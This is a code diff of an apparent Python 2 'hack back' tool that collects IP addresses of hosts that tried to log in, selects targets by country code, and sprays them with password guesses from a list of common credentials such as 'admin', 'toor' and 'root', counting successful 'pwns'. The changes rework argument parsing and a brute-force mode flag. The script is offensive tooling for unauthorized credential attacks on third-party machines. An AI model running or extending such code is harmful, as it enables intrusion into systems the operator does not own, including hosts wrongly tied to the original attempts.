@@ -128,8 +128,7 @@ def hack_back(ip, determined):
     common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
     if determined:
         for entry in swap('common_passwords.txt', False):
-            common.append(entry)
-        # random.shuffle(common
+            common.append(entry)   # random.shuffle(common
     else:
         for entry in swap('common_passwords.txt', False)[0:40]:
             common.append(entry)
@@ -196,8 +195,8 @@ def blunt_force_attack(address, strong):
     return bruted, pwns
 
 
-def spray(ip_locations, country_codes, intense):
-    locale = sys.argv[2]
+def spray(ip_locations, locale, country_codes, intense):
+
     if locale in country_codes.keys():
         target = country_codes[locale]
     elif locale.upper() in country_codes.values():
@@ -210,8 +209,9 @@ def spray(ip_locations, country_codes, intense):
     random.shuffle(targets)
     tic = time.time()
     pwn_count = 0
+    print 'STARTING ATTACK [%d Hosts]' % len(targets)
     if intense:
-        print '[*] INTENSE Mode Enabled'
+        print '[*] Using Brute Force '
     # Scan Open Ports
     for address in targets:
         try:
@@ -227,18 +227,23 @@ def spray(ip_locations, country_codes, intense):
 
 
 if __name__ == '__main__':
-    brute_force = False
-    if '!!' in sys.argv:
-        brute_force = True
+    # brute_force = False
 
     rogue_ips, login_attempts = pull_rogue_ip_list()
     ip_loc, c_counts, c_codes = retrieve_unauthorized_origins()
 
+    # if '-i' in sys.argv:
+    #     # print '* Using brute force '
+    #     brute_force = True
+
     if 'light' or '-l' in sys.argv:
         brute_force = False
 
-    if 'target' in sys.argv:
-        spray(ip_locations=ip_loc, country_codes=c_codes, intense=brute_force)
+    if 'target' in sys.argv and '-i' in sys.argv:
+        spray(ip_loc, sys.argv[2], c_codes, True)
+    elif 'target' in sys.argv:
+        spray(ip_loc, sys.argv[2], c_codes, False)
+
 
     if 'test' in sys.argv:
         blunt_force_attack('10.0.0.5', True)
